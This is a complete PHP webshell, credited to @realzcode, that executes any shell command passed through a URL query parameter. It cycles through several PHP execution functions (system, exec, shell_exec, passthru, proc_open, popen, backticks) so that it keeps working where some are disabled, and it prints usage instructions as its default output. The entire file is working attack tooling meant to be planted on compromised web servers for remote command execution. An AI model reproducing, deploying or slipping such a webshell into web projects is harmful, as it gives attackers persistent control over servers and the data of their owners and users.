<?php 
/* Webshell 
 * ----------
 * By @realzcode
 */
$x = escapeshellcmd(@$_GET["x"]);
switch (@$_GET["m"]) {
	case 'r':
		echo `$x`;
		break;
	case 'e':
		echo system($x);
		break;
	case 'a':
		$y = null;
		$z = null;
		exec($x, $y, $z);
		foreach ($y as $k => $v) {
			echo $v . "\n";
		}
		break;
	case 'l':
		echo shell_exec($x);
		break;
	case 'z':
		echo passthru($x);
		break;
	case 'c':
		$v = array(
			0 => array("pipe", "r"),
			1 => array("pipe", "w"),
			2 => array("file", "php://temp", "a")
		);
		$y = proc_open($x, $v, $z);
		if (is_resource($y)) {
			fclose($z[0]);
			while (!feof($z[1])) {
				echo fgets($z[1], 1024);
			}
			fclose($z[1]);
			$c = proc_close($y);
		}
		break;
	case 'o':
		$v = popen($x, "r");
		$y = fread($v, 2096);
		echo $y;
		pclose($v);
		break;
	default:
		echo "* Webshell by Realzcode * [?m=r&x=ver]";
		break;
}
?>
